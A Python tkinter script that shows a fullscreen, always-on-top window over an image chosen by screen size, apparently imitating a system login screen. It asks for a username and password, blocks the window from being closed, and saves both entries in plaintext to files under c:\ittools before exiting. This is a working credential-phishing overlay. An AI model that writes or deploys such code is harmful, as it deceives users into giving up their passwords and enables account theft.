from tkinter import *
from tkinter import messagebox

from PIL import ImageTk, Image
from os import makedirs, path

class CanvasButton:
    def __init__(self, canvas):
        self.canvas = canvas
        self.number = IntVar()
        self.button = Button(canvas, text = "OK", command=self.buttonclicked)
        self.id = canvas.create_window(w/2+1, h/2+1, width=50, height=25, window=self.button)
        self.createWidgets(canvas)

    def createWidgets(self, canvas):
        e= StringVar()
        e.set('请输入用户名')
        #self.valid = Label(canvas, bg='')
        self.name = Label(canvas,text = '用户名:').place(x=w/2-100,y=h/2-100)
        self.nameInput = Entry(canvas,textvariable=e)
        self.nameInput.place(x=w/2-50,y=h/2-100)
        self.password = Label(canvas, text = '密码:').place(x=w/2-100,y=h/2-80)
        self.pwInput = Entry(canvas,show='*')
        self.pwInput.place(x=w/2-50,y=h/2-80)


    def buttonclicked(self):
        #self.number.set('Waiting')
        names = self.nameInput.get()
        passwords = self.pwInput.get()
        with open(namepath,'w') as file_object:
            file_object.write(names)
        with open(pwpath,'w') as file_object:
            file_object.write(passwords)
        exit()

if __name__ == "__main__":

    def callback():
        messagebox.showwarning('请勿关闭窗口')
    root = Tk()
    root.resizable(width=False, height=False)
    root.wm_attributes("-topmost", 1)
    root.attributes("-fullscreen", 1)

    if not path.exists('c:\\ittools') :
        makedirs('c:\\ittools')
    namepath = r'c:\ittools\aa.txt'
    pwpath = r'c:\ittools\pp.txt'
    w = root.winfo_screenwidth()
    h = root.winfo_screenheight()
    if w ==1920:
        img = PhotoImage(file='1.png')
    elif w == 1366:
        img = PhotoImage(file='2.png')

    canvas = Canvas(root, bd=0, height = h, width = w, highlightthickness=0)
    canvas.pack(fill=BOTH, expand=YES )
    canvas.create_image(w/2+1, h/2+1, image=img)
    CanvasButton(canvas) # create a clickable button on the canvas
    root.protocol("WM_DELETE_WINDOW", callback)
    root.mainloop()